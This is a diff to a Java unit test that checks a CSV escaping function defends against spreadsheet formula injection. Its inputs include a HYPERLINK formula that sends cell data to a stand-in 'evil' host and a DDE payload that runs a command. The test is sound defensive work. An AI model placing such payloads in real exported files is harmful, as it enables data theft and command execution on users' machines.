@@ -13,11 +13,7 @@ import java.io.File;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 
-import static org.junit.Assert.assertArrayEquals;
-import static org.junit.Assert.assertEquals;
-import static org.junit.Assert.assertFalse;
-import static org.junit.Assert.assertThrows;
-import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.*;
 
 public class TaskPersistenceManagerTest {
 
@@ -122,5 +118,31 @@ public class TaskPersistenceManagerTest {
         assertTrue(TaskPersistenceManager.listDistinctHosts().contains("https://deleted.test"));
         assertEquals(1, TaskPersistenceManager.deleteByLabels(List.of("delete-me")));
         assertFalse(TaskPersistenceManager.listDistinctHosts().contains("https://deleted.test"));
+    }
+
+    @Test
+    public void csvCellsFromScannedSitesCannotBecomeSpreadsheetFormulas() {
+        // Formula triggers, including DDE and leading-blank / full-width variants.
+        assertEquals("'=1+1", TaskPersistenceManager.escapeCsv("=1+1"));
+        assertEquals("\"'=HYPERLINK(\"\"http://evil/?\"\"&A2,\"\"x\"\")\"",
+                TaskPersistenceManager.escapeCsv("=HYPERLINK(\"http://evil/?\"&A2,\"x\")"));
+        assertEquals("'=cmd|' /C calc'!A0", TaskPersistenceManager.escapeCsv("=cmd|' /C calc'!A0"));
+        assertEquals("'+1+1", TaskPersistenceManager.escapeCsv("+1+1"));
+        assertEquals("'-1+1", TaskPersistenceManager.escapeCsv("-1+1"));
+        assertEquals("'@SUM(A1)", TaskPersistenceManager.escapeCsv("@SUM(A1)"));
+        assertEquals("'  =1+1", TaskPersistenceManager.escapeCsv("  =1+1"));
+        assertEquals("' =1+1", TaskPersistenceManager.escapeCsv(" =1+1"));
+        assertEquals("'\t=1+1", TaskPersistenceManager.escapeCsv("\t=1+1"));
+        assertEquals("\"'\r=1+1\"", TaskPersistenceManager.escapeCsv("\r=1+1"));
+        assertEquals("'＝1+1", TaskPersistenceManager.escapeCsv("＝1+1"));
+        // Ordinary values, including numbers that start with a sign, are unchanged.
+        assertEquals("-1", TaskPersistenceManager.escapeCsv("-1"));
+        assertEquals("+3.5", TaskPersistenceManager.escapeCsv("+3.5"));
+        assertEquals("200", TaskPersistenceManager.escapeCsv("200"));
+        assertEquals("/api?a=1", TaskPersistenceManager.escapeCsv("/api?a=1"));
+        assertEquals("https://example.test/-x", TaskPersistenceManager.escapeCsv("https://example.test/-x"));
+        assertEquals("\"a,b\"", TaskPersistenceManager.escapeCsv("a,b"));
+        assertEquals("", TaskPersistenceManager.escapeCsv(null));
+        assertEquals("  ", TaskPersistenceManager.escapeCsv("  "));
     }
 }
